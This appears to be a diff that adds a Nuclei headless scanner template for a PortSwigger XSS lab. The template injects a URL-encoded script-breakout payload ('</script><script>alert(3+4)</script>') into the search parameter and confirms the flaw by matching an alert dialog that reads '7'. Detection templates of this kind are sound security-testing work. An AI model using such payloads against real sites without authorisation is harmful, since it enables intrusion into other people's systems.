@@ -1,0 +1,28 @@
+# run with flag $ nuclei -headless
+
+id: lab-javascript-string-single-quote-backslash-escaped
+
+info:
+  name: xss_lab-javascript-string-single-quote-backslash-escaped
+  author: FIR_UIII
+  severity: high
+  description: Reflected XSS into a JavaScript string with single quote and backslash escaped
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?search=%3C%2Fscript%3E%3Cscript%3Ealert%283%2B4%29%3C%2Fscript%3E"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers-condition: and
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "7" # 3+4
+        condition: and
